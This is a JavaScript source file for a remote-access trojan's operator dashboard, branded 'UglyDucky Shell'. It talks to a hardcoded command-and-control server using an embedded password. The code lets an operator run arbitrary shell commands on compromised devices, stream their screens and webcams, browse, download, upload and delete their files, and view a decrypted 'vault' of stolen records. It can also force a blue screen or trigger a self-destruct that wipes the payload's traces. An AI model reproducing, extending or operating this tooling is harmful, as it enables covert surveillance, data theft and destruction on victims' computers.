// File: app.js
// ==================================================================
// --- SYSTEM CONFIGURATION ---
// ==================================================================
// These values are securely baked into the client to prevent user tampering.
const C2_LISTENER_URL = "https://uglyducky-c2.onrender.com"; 
const DASHBOARD_PASSWORD = "ducky_admin_2024"; 

// Only visual preferences are loaded from local storage
let ENABLE_CRT = localStorage.getItem('ducky_c2_crt') !== 'false'; 

// --- GLOBAL STATE ---
let activeNodeId = null; 
let globalData = [];
let allNodes = []; 

// --- Interactive Map State ---
let leafletMap = null;
let leafletMarkers = [];

// --- Live View State ---
let streamInterval = null;
let streamSwitchTime = 0; 
let streamTimeoutTracker = null; 
let currentStreamSessionId = null; 
const STREAM_POLL_RATE = 250; 

// --- Terminal & Filesystem State ---
let terminalPollInterval = null; 
let fsPollInterval = null;
let currentFsPath = null;
const FS_POLL_RATE = 2000; 
const FS_POLL_TIMEOUT = 20000; 

// --- Floating UI State ---
let isFloatingMode = false;
let floatZIndex = 100;
let activeFloatPanel = null;
let isDraggingFloat = false;
let isResizingFloat = false;
let floatStartX = 0, floatStartY = 0;
let panelStartLeft = 0, panelStartTop = 0;
let panelStartWidth = 0, panelStartHeight = 0;
let floatingStates = {}; 

// ==========================================
// INITIALIZATION
// ==========================================
document.addEventListener("DOMContentLoaded", () => {
    applySettingsToUI();
    initXRayScanner();
    initDragAndDrop();
    initResizers();
    initFloatingWindowManager();
    
    switchView('home'); 
    renderNodesList(); 
});

// ==========================================
// PREFERENCES & UI NAVIGATION
// ==========================================
function applySettingsToUI() {
    document.getElementById('setting-crt').checked = ENABLE_CRT;
    
    const scanlines = document.getElementById('scanlines');
    if (ENABLE_CRT) scanlines.classList.add('active');
    else scanlines.classList.remove('active');

    updateHomeStats();
}

window.saveSettings = function() {
    ENABLE_CRT = document.getElementById('setting-crt').checked;
    localStorage.setItem('ducky_c2_crt', ENABLE_CRT);

    applySettingsToUI();
    showToast("Preferences saved.", "success");
};

window.switchView = function(viewId) {
    document.querySelectorAll('.view-section').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.nav-btn').forEach(el => el.classList.remove('active'));
    
    document.getElementById('view-' + viewId).classList.add('active');
    document.getElementById('nav-' + viewId).classList.add('active');
    
    if (viewId === 'rat') {
        if (!leafletMap) initMap();
        else setTimeout(() => leafletMap.invalidateSize(true), 100);
    }
    
    if (viewId === 'home') {
        updateHomeStats();
    }
};

function updateHomeStats() {
    const nodesDisplay = document.getElementById('stat-nodes');
    if(nodesDisplay) nodesDisplay.innerText = allNodes.length || '--';
    
    const recordsDisplay = document.getElementById('stat-records');
    if(recordsDisplay) recordsDisplay.innerText = globalData.length || '--';
}

// ==========================================
// THE ARMORY: X-RAY SCANNER
// ==========================================
function initXRayScanner() {
    const container = document.getElementById('xray-container');
    const xrayImg = document.getElementById('img-xray');
    const xrayRing = document.getElementById('xray-ring');
    
    if(!container || !xrayImg || !xrayRing) return;
    
    const radius = 75; 

    container.addEventListener('mousemove', (e) => {
        const rect = container.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;

        xrayImg.style.clipPath = `circle(${radius}px at ${x}px ${y}px)`;
        xrayRing.style.left = `${x}px`;
        xrayRing.style.top = `${y}px`;
    });

    container.addEventListener('mouseleave', () => {
        xrayImg.style.clipPath = `circle(0px at center)`;
    });
}

// ==========================================
// UTILITIES
// ==========================================
function getSafeCoord(val, isLat) {
    const defaultCoord = isLat ? 28.5383 : -81.3792;
    if (val === undefined || val === null || val === '') return defaultCoord;
    const parsed = parseFloat(val);
    if (isNaN(parsed)) return defaultCoord;
    return parsed;
}

window.showToast = function(msg, type="success") {
    const toast = document.getElementById('toast');
    const icon = document.getElementById('toastIcon');
    document.getElementById('toastMsg').innerText = msg;
    
    if (type === "error") {
        toast.classList.replace('border-neon', 'border-red-500');
        icon.className = "fa-solid fa-triangle-exclamation text-red-500";
    } else {
        toast.classList.replace('border-red-500', 'border-neon');
        icon.className = "fa-solid fa-circle-check text-neon";
    }
    
    toast.classList.replace('translate-y-24', 'translate-y-0');
    toast.classList.replace('opacity-0', 'opacity-100');
    
    setTimeout(() => {
        toast.classList.replace('translate-y-0', 'translate-y-24');
        toast.classList.replace('opacity-100', 'opacity-0');
    }, 3000);
};

// ==========================================
// LEAFLET MAP ENGINE
// ==========================================
function initMap() {
    const mapContainer = document.getElementById('map-container');
    if (!mapContainer || leafletMap) return;

    const worldBounds = [[-90, -180], [90, 180]];

    leafletMap = L.map('map-container', {
        zoomControl: false, attributionControl: false, 
        maxBounds: worldBounds, maxBoundsViscosity: 1.0, minZoom: 2                    
    }).setView([20, 0], 2);

    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
        subdomains: 'abcd', maxZoom: 19, minZoom: 2, noWrap: true, bounds: worldBounds
    }).addTo(leafletMap);

    new ResizeObserver(() => {
        if (leafletMap) leafletMap.invalidateSize();
    }).observe(mapContainer);

    setTimeout(() => {
        leafletMap.invalidateSize(true);
        renderMap(); 
    }, 100);
}

function renderMap() {
    if (!leafletMap) return;
    leafletMarkers.forEach(m => leafletMap.removeLayer(m));
    leafletMarkers = [];
    
    allNodes.forEach(node => {
        let dotColor = node.status === 'green' ? 'text-green-500' : (node.status === 'red' ? 'text-red-500' : 'text-yellow-500');
        let safeLat = getSafeCoord(node.lat, true);
        let safeLng = getSafeCoord(node.lng, false);
        
        const customHtml = `
            <div class="map-dot ${dotColor}" onclick="leafletMap.flyTo([${safeLat}, ${safeLng}], 5)">
                <div class="map-tooltip text-[10px] text-left pointer-events-none">
                    <div class="font-bold text-white border-b border-gray-700 pb-1 mb-1">${node.id}</div>
                    <div class="text-gray-400">IP: <span class="text-cyberBlue">${node.ip}</span></div>
                    <div class="text-gray-400">OS: <span class="text-white">${node.os}</span></div>
                    <div class="text-gray-400">STAT: <span class="${dotColor}">${node.status.toUpperCase()}</span></div>
                </div>
            </div>`;

        const customIcon = L.divIcon({ className: 'bg-transparent border-none', iconSize: [14, 14], iconAnchor: [7, 7], html: customHtml });
        const marker = L.marker([safeLat, safeLng], { icon: customIcon }).addTo(leafletMap);
        leafletMarkers.push(marker);
    });
}

// ==========================================
// DEVICE AUTHENTICATION & FETCHING
// ==========================================
document.getElementById("deviceId").addEventListener("keypress", function(e) {
    if (e.key === "Enter") { e.preventDefault(); fetchData(); }
});

async function fetchData() {
    const deviceId = document.getElementById('deviceId').value.trim();
    if (!deviceId) return showToast("Device ID missing.", "error");

    const statusMsg = document.getElementById('statusMsg');
    const btn = document.getElementById('connectBtn');
    
    allNodes = []; globalData = []; activeNodeId = null;
    document.getElementById('output').innerHTML = "";
    document.getElementById('filterContainer').classList.add('hidden');
    document.getElementById('exportBtn').classList.add('hidden');
    
    document.getElementById('fs-active-node').innerText = "None";
    document.getElementById('fsTbody').innerHTML = `<tr><td colspan="4" class="text-center p-4 text-gray-600">Select target node to load files...</td></tr>`;
    document.getElementById('terminal-connection-msg').innerText = "Waiting for node...";
    stopStream();

    renderMap(); renderNodesList(); updateHomeStats();

    statusMsg.classList.remove('hidden');
    statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Establishing secure uplink...';
    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Connecting';

    try {
        const nodeResponse = await fetch(`${C2_LISTENER_URL}/node/${deviceId}`, {
            method: 'GET',
            headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD, "Accept": "application/json" }
        });
        
        if (!nodeResponse.ok) {
            throw new Error(`Device ID not found or offline.`);
        }
        
        const nodeData = await nodeResponse.json();
        
        nodeData.lat = getSafeCoord(nodeData.lat, true);
        nodeData.lng = getSafeCoord(nodeData.lng, false);
        
        activeNodeId = nodeData.id;
        allNodes = [nodeData]; 
        renderNodesList(); renderMap(); updateHomeStats();
        
        selectNode(activeNodeId); 

        statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Uplink stable. Synchronizing Vault...';
        
        const logsResponse = await fetch(`${C2_LISTENER_URL}/logs/${deviceId}`, {
            method: 'GET',
            headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD, "Accept": "application/json" }
        });
        
        if (!logsResponse.ok) throw new Error("Synchronization failed.");
        
        globalData = await logsResponse.json();
        updateHomeStats();

        const transitionToControlPanel = () => {
            switchView('rat');
            setTimeout(() => {
                if (leafletMap) {
                    leafletMap.invalidateSize(true);
                    leafletMap.flyTo([nodeData.lat, nodeData.lng], 4, {duration: 1.5});
                }
            }, 300); 
        };

        if (globalData.length === 0) {
            statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-yellow-500 mr-2"></i>Device active, but no vault data exists yet.`;
            showToast("Device is active but has no vault data.", "error");
            setTimeout(transitionToControlPanel, 1000); 
        } else {
            statusMsg.innerHTML = `<i class="fa-solid fa-lock-open text-green-500 mr-2"></i>Vault Decrypted. [${globalData.length} records]`;
            document.getElementById('exportBtn').classList.remove('hidden');
            buildFilters();
            renderCards(globalData, document.getElementById('output'));
            showToast("Link successful! Data loaded.", "success");
            setTimeout(transitionToControlPanel, 1000); 
        }

    } catch (error) {
        statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-red-500 mr-2"></i>Error: ${error.message}`;
        showToast("Device Not Found", "error");
    } finally {
        btn.disabled = false;
        btn.innerHTML = '<i class="fa-solid fa-unlock-keyhole mr-2"></i> Access';
    }
}

// ==========================================
// RENDER & SELECTION LOGIC (TARGETS)
// ==========================================
function renderNodesList() {
    const container = document.getElementById('nodes-list');
    if(!container) return;
    container.innerHTML = '';
    
    if (allNodes.length === 0) {
        container.innerHTML = `<p class="text-gray-500 p-4 text-xs font-mono">Authenticate a Device ID to begin.</p>`;
        return;
    }

    allNodes.forEach(node => {
        let dotColor = node.status === 'green' ? 'bg-green-500' : (node.status === 'red' ? 'bg-red-500' : 'bg-yellow-500');
        let activeBorder = 'border border-neon bg-neon/5'; 
        let activeLine = '<div class="absolute left-0 top-0 bottom-0 w-1 bg-neon"></div>';
        let pulse = node.status === 'green' ? 'animate-pulse' : '';

        let osLower = (node.os || "").toLowerCase();
        let osIconClass = 'fa-brands fa-windows text-cyberBlue'; 
        
        if (osLower.includes('mac') || osLower.includes('darwin')) osIconClass = 'fa-brands fa-apple text-gray-300';
        else if (osLower.includes('linux') || osLower.includes('ubuntu')) osIconClass = 'fa-brands fa-linux text-yellow-400';
        
        let safeLat = getSafeCoord(node.lat, true);
        let safeLng = getSafeCoord(node.lng, false);

        container.innerHTML += `
            <div class="p-2 ${activeBorder} rounded-lg relative overflow-hidden group transition-all cursor-pointer" onclick="if(leafletMap) leafletMap.flyTo([${safeLat}, ${safeLng}], 5)">
                ${activeLine}
                <div class="flex justify-between items-start mb-1 pl-2">
                    <div class="flex items-center gap-2">
                        <i class="${osIconClass} text-base"></i>
                        <div>
                            <p class="text-xs font-bold text-white truncate max-w-[120px]">${node.id}</p>
                            <p class="text-[9px] text-gray-400 font-mono">${node.ip}</p>
                        </div>
                    </div>
                    <span class="w-2 h-2 mt-1 rounded-full ${dotColor} ${pulse} shadow-[0_0_8px_currentColor]"></span>
                </div>
                <p class="text-[9px] text-gray-500 pl-2 truncate" title="${node.os}">${node.os}</p>
            </div>`;
    });
}

// ==========================================
// TERMINAL LOGIC (REAL PASSTHROUGH)
// ==========================================
window.selectNode = function(nodeId) {
    appendTerminalText(`Session established. Bound to Device: ${nodeId}`, "system");
    document.getElementById('terminal-connection-msg').innerText = `Encrypted link active for ${nodeId}`;
    
    document.getElementById('fs-active-node').innerText = nodeId;
    requestDirectoryListing('DRIVES');

    if (terminalPollInterval) clearInterval(terminalPollInterval);
    
    terminalPollInterval = setInterval(async () => {
        if (!activeNodeId) return;
        try {
            const res = await fetch(`${C2_LISTENER_URL}/shell/${activeNodeId}`, {
                headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
            });
            if (res.ok) {
                const data = await res.json();
                if (data.outputs && data.outputs.length > 0) {
                    data.outputs.forEach(out => appendTerminalText(out, "output"));
                }
            }
        } catch(e) {}
    }, 2000); 
};

function appendTerminalText(msg, type="system") {
    const term = document.getElementById('terminal-output');
    if(!term) return;
    
    const promptEl = term.querySelector('.terminal-prompt');
    if (promptEl) promptEl.remove();

    const line = document.createElement('div');
    if (type === "system") {
        line.className = "text-gray-500 mt-1 italic"; 
        line.innerText = `[*] ${msg}`;
    } else if (type === "user") {
        line.className = "text-white mt-1 font-bold";
        line.innerText = msg; 
    } else if (type === "output") {
        line.className = "text-gray-300 mt-1 whitespace-pre-wrap break-all"; 
        line.innerText = msg;
    }
    term.appendChild(line);
    
    const prompt = document.createElement('div'); 
    prompt.className = "mt-2 text-green-400 terminal-prompt flex flex-shrink-0"; 
    prompt.innerHTML = `<span class="mr-2">C:\\></span> <span class="cursor-blink"></span>`;
    term.appendChild(prompt);
    
    term.scrollTop = term.scrollHeight;
}

window.termLog = function(msg) { appendTerminalText(msg, "system"); };

window.executeTermCommand = function(inputEl) {
    const val = inputEl.value.trim();
    if(!val) return;
    
    appendTerminalText(`C:\\> ${val}`, "user");
    
    setTimeout(() => {
        if(val.toLowerCase() === 'clear' || val.toLowerCase() === 'cls') { 
            const term = document.getElementById('terminal-output');
            term.innerHTML = `
                <div class="text-cyberBlue">UglyDucky Shell v3.0</div>
                <div class="mt-2 text-green-400 terminal-prompt flex flex-shrink-0">
                    <span class="mr-2">C:\\></span> <span class="cursor-blink"></span>
                </div>`;
            inputEl.value = ''; 
            return; 
        }
        
        if(val.toUpperCase() === 'BSOD' || val.toUpperCase() === 'BURN') {
            termLog(`Forwarding critical payload to device...`);
            sendCommandToNode(activeNodeId, val.toUpperCase() === 'BURN' ? "SELF_DESTRUCT" : "BSOD");
        } else {
            termLog(`Executing command on target: ${val}...`);
            sendCommandToNode(activeNodeId, `SHELL:${val}`);
        }
    }, 50);
    
    inputEl.value = '';
};

// ==========================================
// COMMAND FUNCTIONS
// ==========================================
async function sendCommandToNode(deviceId, command) {
    if (!deviceId) return showToast("No active node selected!", "error");
    
    try {
        const response = await fetch(`${C2_LISTENER_URL}/issue`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-Dashboard-Password': DASHBOARD_PASSWORD },
            body: JSON.stringify({ device_id: deviceId, command: command })
        });
        
        if (!response.ok) throw new Error(`Network responded with ${response.status}`);
    } catch (error) {
        showToast(`Failed to send command.`, "error");
        termLog(`[ERROR] Failed to send command: ${error.message}`);
    }
}

// ==========================================
// LIVE VIEW STREAMING
// ==========================================
function setStreamLoadingState() {
    const spinner = document.getElementById('liveViewSpinner');
    const imageEl = document.getElementById('liveViewImage');
    
    imageEl.style.display = 'none';
    imageEl.src = ''; 
    
    spinner.style.display = 'flex';
    spinner.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-3xl mb-2"></i><p class="text-gray-400 font-mono text-[10px]">Retrieving stream frames...</p>`;
    
    if (streamTimeoutTracker) clearTimeout(streamTimeoutTracker);
    
    streamTimeoutTracker = setTimeout(() => {
        spinner.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-yellow-500 text-3xl mb-2"></i><p class="text-gray-400 font-mono text-[10px] text-center px-4">Timeout exceeded (10s).<br>Target may be offline.</p>`;
    }, 10000);
}

window.toggleStream = function() {
    if (!activeNodeId) return showToast("No active node selected!", "error");
    if (streamInterval) stopStream();
    else startStream();
};

window.changeStreamQuality = function(val) {
    document.getElementById('qualityLabel').innerText = `Q:${val}`;
    if (streamInterval) {
        let streamTarget = document.getElementById('streamTarget').value;
        sendCommandToNode(activeNodeId, `START_STREAM:${streamTarget}|${val}`);
    }
};

window.startStream = async function() {
    if (!activeNodeId) return showToast("No active node selected!", "error");

    const panel = document.getElementById('panel-live');
    if (panel.dataset.minimized === 'true') {
        toggleMinimize(panel.querySelector('.fa-window-restore').parentElement, 'panel-live');
    }

    if (streamInterval) stopStream(); 

    const targetVal = document.getElementById('streamTarget').value;
    const quality = document.getElementById('streamQuality').value;
    const title = document.getElementById('liveViewTitle');
    const toggleBtn = document.getElementById('streamToggleBtn');
    
    currentStreamSessionId = Date.now();
    streamSwitchTime = Date.now();
    setStreamLoadingState();

    toggleBtn.className = "w-4 h-4 rounded-full bg-red-500/20 text-red-500 hover:bg-red-500 hover:text-white flex items-center justify-center text-[8px]";
    toggleBtn.innerHTML = '<i class="fa-solid fa-stop"></i>';
    toggleBtn.title = "Stop Stream";

    title.innerHTML = targetVal.includes("SCREEN") 
        ? `<i class="fa-solid fa-desktop text-cyberBlue mr-2 text-glow-blue"></i>Screen: ${activeNodeId}` 
        : `<i class="fa-solid fa-camera text-cyberBlue mr-2 text-glow-blue"></i>Cam: ${activeNodeId}`;

    termLog(`Initiating stream for ${targetVal} at Quality ${quality}...`);
    await sendCommandToNode(activeNodeId, `START_STREAM:${targetVal}|${quality}`);
    
    document.getElementById('streamTarget').onchange = () => {
        if(streamInterval) {
            currentStreamSessionId = Date.now();
            streamSwitchTime = Date.now();
            setStreamLoadingState(); 
            termLog(`Switching stream source...`);
            
            const newTarget = document.getElementById('streamTarget').value;
            sendCommandToNode(activeNodeId, `START_STREAM:${newTarget}|${document.getElementById('streamQuality').value}`);
            
            title.innerHTML = newTarget.includes("SCREEN") 
                ? `<i class="fa-solid fa-desktop text-cyberBlue mr-2 text-glow-blue"></i>Screen: ${activeNodeId}` 
                : `<i class="fa-solid fa-camera text-cyberBlue mr-2 text-glow-blue"></i>Cam: ${activeNodeId}`;
        }
    };

    streamInterval = setInterval(fetchFrame, STREAM_POLL_RATE);
};

async function fetchFrame() {
    if (!activeNodeId || !currentStreamSessionId) return;
    const mySessionId = currentStreamSessionId;

    if (Date.now() - streamSwitchTime < 3500) return;
    
    const targetVal = document.getElementById('streamTarget').value;
    const cacheKey = targetVal === 'WEBCAM' ? 'webcam' : targetVal.toLowerCase();
    
    try {
        const response = await fetch(`${C2_LISTENER_URL}/frames/${activeNodeId}/${cacheKey}`, {
            headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
        });
        
        if (mySessionId !== currentStreamSessionId) return;
        
        if (response.ok) {
            const data = await response.json();
            if (data && data.frame) {
                const imageEl = document.getElementById('liveViewImage');
                imageEl.src = `data:image/jpeg;base64,${data.frame}`;
                
                if (streamTimeoutTracker) {
                    clearTimeout(streamTimeoutTracker);
                    streamTimeoutTracker = null;
                }
                
                document.getElementById('liveViewSpinner').style.display = 'none';
                imageEl.style.display = 'block';
            }
        }
    } catch (e) {}
}

window.stopStream = function() {
    if (streamInterval) { clearInterval(streamInterval); streamInterval = null; }
    if (streamTimeoutTracker) { clearTimeout(streamTimeoutTracker); streamTimeoutTracker = null; }
    
    currentStreamSessionId = null;
    
    if (activeNodeId) {
        sendCommandToNode(activeNodeId, "STOP_STREAM");
        termLog(`Stream stopped for ${activeNodeId}.`);
    }

    const toggleBtn = document.getElementById('streamToggleBtn');
    if (toggleBtn) {
        toggleBtn.className = "w-4 h-4 rounded-full bg-green-500/20 text-green-500 hover:bg-green-500 hover:text-white flex items-center justify-center text-[8px]";
        toggleBtn.innerHTML = '<i class="fa-solid fa-play"></i>';
        toggleBtn.title = "Play Stream";
    }
    
    const imageEl = document.getElementById('liveViewImage');
    imageEl.style.display = 'none';
    imageEl.src = ''; 
    
    document.getElementById('liveViewTitle').innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-500 mr-2"></i>Live Stream`;
    
    const spinner = document.getElementById('liveViewSpinner');
    if(spinner) {
        spinner.style.display = 'flex';
        spinner.innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-700 text-3xl mb-2"></i><p class="text-gray-500 font-mono text-[10px] mt-2">Stream Idle</p>`;
    }
};

window.triggerBSOD = function() {
    termLog('Command queued: BSOD (Blue Screen)');
    sendCommandToNode(activeNodeId, 'BSOD');
};

window.triggerScorchedEarth = function() {
    if(confirm('WARNING: THIS WILL DELETE THE PAYLOAD AND ALL TRACES.\n\nContinue?')) {
        termLog('Command queued: Payload Self-Destruct');
        sendCommandToNode(activeNodeId, 'SELF_DESTRUCT');
    }
};

// ==========================================
// FILE EXPLORER
// ==========================================
function requestDirectoryListing(path) {
    if (!activeNodeId) return;

    if (fsPollInterval) clearInterval(fsPollInterval);

    currentFsPath = path;
    updateBreadcrumbs(path);
    
    const tbody = document.getElementById('fsTbody');
    tbody.innerHTML = `
        <tr class="border-b border-gray-800/60">
            <td colspan="4" class="p-4 text-center text-gray-400 font-mono">
                <i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-lg"></i>
                <p class="mt-1 text-[10px]">Loading "${path}"...</p>
            </td>
        </tr>
    `;

    sendCommandToNode(activeNodeId, `LIST_DIR:${path}`);

    const pollStartTime = Date.now();
    
    fsPollInterval = setInterval(async () => {
        if (Date.now() - pollStartTime > FS_POLL_TIMEOUT) {
            clearInterval(fsPollInterval);
            fsPollInterval = null;
            tbody.innerHTML = `
                <tr class="border-b border-gray-800/60">
                    <td colspan="4" class="p-4 text-center text-red-500 font-mono text-[10px]">
                        Request timed out. Target may be offline.
                    </td>
                </tr>
            `;
            return;
        }

        try {
            const response = await fetch(`${C2_LISTENER_URL}/fs/${activeNodeId}`, {
                headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
            });
            
            if (response.ok) {
                clearInterval(fsPollInterval);
                fsPollInterval = null;
                const data = await response.json();
                renderFileSystem(data);
            }
        } catch (e) {}
    }, FS_POLL_RATE);
}

function renderFileSystem(data) {
    const tbody = document.getElementById('fsTbody');
    tbody.innerHTML = '';

    if (data.error) {
        tbody.innerHTML = `
            <tr class="border-b border-gray-800/60">
                <td colspan="4" class="p-4 text-center text-red-500 font-mono text-[10px]">
                    <i class="fa-solid fa-triangle-exclamation mr-1"></i>${escapeHtml(data.error)}
                </td>
            </tr>
        `;
        return;
    }
    
    if (!data.contents || data.contents.length === 0) {
        tbody.innerHTML = `
            <tr class="border-b border-gray-800/60">
                <td colspan="4" class="p-4 text-center text-gray-500 font-mono text-[10px]">
                    Directory is empty.
                </td>
            </tr>
        `;
        return;
    }

    data.contents.sort((a, b) => {
        if (a.type === b.type) return a.name.localeCompare(b.name, undefined, {numeric: true});
        return a.type === 'directory' || a.type === 'drive' ? -1 : 1;
    });

    data.contents.forEach(item => {
        let icon, color, action;
        const fullPath = (data.path === 'DRIVES' ? item.name : `${data.path.replace(/\\$/, '')}\\${item.name}`).replace(/\\/g, '\\\\');

        let actionButtons = '';
        if (item.type !== 'drive' && item.type !== 'inaccessible') {
            const isDir = item.type === 'directory';
            if (!isDir) {
                actionButtons += `<button class="text-cyberBlue hover:text-white mx-0.5" title="Download" onclick="event.stopPropagation(); downloadFile('${fullPath}')"><i class="fa-solid fa-download"></i></button>`;
            }
            actionButtons += `<button class="text-yellow-500 hover:text-white mx-0.5" title="Rename" onclick="event.stopPropagation(); renameItem('${fullPath}', '${escapeHtml(item.name.replace(/'/g, "\\'"))}')"><i class="fa-solid fa-pen"></i></button>`;
            actionButtons += `<button class="text-red-500 hover:text-white mx-0.5" title="Delete" onclick="event.stopPropagation(); deleteItem('${fullPath}', ${isDir})"><i class="fa-solid fa-trash"></i></button>`;
        }

        switch (item.type) {
            case 'drive':
                icon = 'fa-hdd'; color = 'text-gray-400';
                action = `onclick="requestDirectoryListing('${fullPath}')"`; break;
            case 'directory':
                icon = 'fa-folder'; color = 'text-yellow-500';
                action = `onclick="requestDirectoryListing('${fullPath}')"`; break;
            case 'file':
                icon = 'fa-file-lines'; color = 'text-cyberBlue'; action = ``; break;
            default:
                icon = 'fa-ban'; color = 'text-red-600'; action = `title="Permission Denied"`; break;
        }

        const size = item.size > 0 ? formatBytes(item.size) : '';
        const row = document.createElement('tr');
        row.className = 'border-b border-gray-800/60 hover:bg-neon/10 transition-colors cursor-pointer';
        
        row.innerHTML = `
            <td class="p-1.5 pl-2 text-center ${color}" ${action}><i class="fa-regular ${icon}"></i></td>
            <td class="p-1.5 font-bold text-gray-300 truncate max-w-[100px]" ${action} title="${escapeHtml(item.name)}">${escapeHtml(item.name)}</td>
            <td class="p-1.5 text-right text-gray-400 whitespace-nowrap" ${action}>${size}</td>
            <td class="p-1.5 text-center whitespace-nowrap">${actionButtons}</td>
        `;
        tbody.appendChild(row);
    });
}

window.deleteItem = function(fullPath, isDir) {
    const type = isDir ? 'folder' : 'file';
    if(confirm(`Are you sure you want to permanently delete this ${type}?\n\nTarget: ${fullPath}`)) {
        sendCommandToNode(activeNodeId, `DELETE:${fullPath}`);
        showToast(`Delete command sent for ${fullPath}`);
        setTimeout(() => requestDirectoryListing(currentFsPath), 2000); 
    }
};

window.renameItem = function(fullPath, currentName) {
    const newName = prompt(`Enter new name for ${currentName}:`, currentName);
    if(newName && newName !== currentName) {
        const dirPath = fullPath.substring(0, fullPath.lastIndexOf('\\'));
        const newPath = dirPath + '\\' + newName;
        sendCommandToNode(activeNodeId, `RENAME:${fullPath}|${newPath}`);
        showToast(`Rename command sent.`);
        setTimeout(() => requestDirectoryListing(currentFsPath), 2000);
    }
};

let downloadPollInterval = null;
window.downloadFile = function(fullPath) {
    sendCommandToNode(activeNodeId, `DOWNLOAD_FILE:${fullPath}`);
    showToast(`Requesting download (May take a moment)`);
    
    if (downloadPollInterval) clearInterval(downloadPollInterval);
    
    const startTime = Date.now();
    
    downloadPollInterval = setInterval(async () => {
        if(Date.now() - startTime > 45000) { 
            clearInterval(downloadPollInterval);
            showToast("Download timed out or file too large.", "error");
            return;
        }
        try {
            const res = await fetch(`${C2_LISTENER_URL}/fs_download/${activeNodeId}`, { 
                headers: {'X-Dashboard-Password': DASHBOARD_PASSWORD} 
            });
            if (res.ok) {
                clearInterval(downloadPollInterval);
                const data = await res.json();
                
                if(data.error) showToast(`Download failed: ${data.error}`, "error");
                else if(data.data && data.filename) {
                    const link = document.createElement('a');
                    link.href = 'data:application/octet-stream;base64,' + data.data;
                    link.download = data.filename;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    showToast("Download complete!", "success");
                }
            }
        } catch(e) {}
    }, 2000);
};

window.triggerUpload = function() { document.getElementById('fileUploadInput').click(); };

document.getElementById('fileUploadInput').onchange = function(e) { 
    const file = e.target.files[0];
    if(!file) return;
    if(!currentFsPath || currentFsPath === 'DRIVES') return showToast("Navigate to a directory first.", "error");
    if(file.size > 10 * 1024 * 1024) return showToast("File exceeds 10MB limit.", "error");

    const reader = new FileReader();
    reader.onload = function(evt) {
        const base64Data = evt.target.result.split(',')[1];
        const destPath = currentFsPath.endsWith('\\') ? currentFsPath + file.name : currentFsPath + '\\' + file.name;
        
        sendCommandToNode(activeNodeId, `UPLOAD_FILE:${destPath}|${base64Data}`);
        showToast(`Uploading ${file.name}...`);
        
        setTimeout(() => requestDirectoryListing(currentFsPath), 3500);
    };
    reader.readAsDataURL(file);
    e.target.value = ''; 
};

function updateBreadcrumbs(path) {
    const container = document.getElementById('fsBreadcrumbs');
    container.innerHTML = '';
    
    if (!path || path === 'DRIVES') {
        container.innerHTML = `<span class="text-gray-500">Drives</span>`;
        return;
    }

    const parts = path.split('\\').filter(p => p);
    let currentPath = '';
    
    parts.forEach((part, index) => {
        currentPath += part + '\\\\';
        const isLast = index === parts.length - 1;
        
        if (isLast) container.innerHTML += `<span class="text-white font-bold">${escapeHtml(part)}</span>`;
        else container.innerHTML += `<span class="text-gray-400 hover:text-white cursor-pointer" onclick="requestDirectoryListing('${currentPath}')">${escapeHtml(part)}</span><span class="text-gray-600 mx-0.5">/</span>`;
    });
}

function formatBytes(bytes, decimals = 1) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

window.navigateUp = function() {
    if (!currentFsPath || currentFsPath === 'DRIVES') return requestDirectoryListing('DRIVES');
    if (currentFsPath.endsWith(':\\') && currentFsPath.length === 3) return requestDirectoryListing('DRIVES');
    
    const lastSlash = currentFsPath.replace(/\\$/, '').lastIndexOf('\\');
    
    if (lastSlash === -1) requestDirectoryListing('DRIVES');
    else if (lastSlash === 2 && currentFsPath[1] === ':') requestDirectoryListing(currentFsPath.substring(0, lastSlash + 1));
    else requestDirectoryListing(currentFsPath.substring(0, lastSlash));
};

// ==========================================
// TILING WINDOW MANAGER
// ==========================================
let draggedPanel = null;
function initDragAndDrop() {
    document.querySelectorAll('.draggable-header').forEach(header => {
        const newHeader = header.cloneNode(true);
        header.parentNode.replaceChild(newHeader, header);
    });
    
    document.querySelectorAll('.drag-slot').forEach(slot => {
        const newSlot = slot.cloneNode(true);
        slot.parentNode.replaceChild(newSlot, slot);
    });

    document.querySelectorAll('.draggable-header').forEach(header => {
        header.addEventListener('dragstart', (e) => {
            if (isFloatingMode) { e.preventDefault(); return; }
            if (e.target.tagName === 'BUTTON' || e.target.closest('button') || header.parentElement.classList.contains('maximized') || e.target.tagName === 'SELECT' || e.target.tagName === 'INPUT') { 
                e.preventDefault(); return; 
            }
            draggedPanel = header.closest('.drag-panel');
            e.dataTransfer.effectAllowed = 'move';
            e.dataTransfer.setData('text/plain', '');
            setTimeout(() => draggedPanel.classList.add('dragging'), 0);
        });
        
        header.addEventListener('dragend', () => {
            if(draggedPanel) draggedPanel.classList.remove('dragging');
            draggedPanel = null;
            document.querySelectorAll('.drag-slot').forEach(s => s.classList.remove('drag-over'));
        });
    });

    document.querySelectorAll('.drag-slot').forEach(slot => {
        slot.addEventListener('dragover', (e) => {
            e.preventDefault(); 
            if(draggedPanel && slot !== draggedPanel.parentElement) slot.classList.add('drag-over');
        });
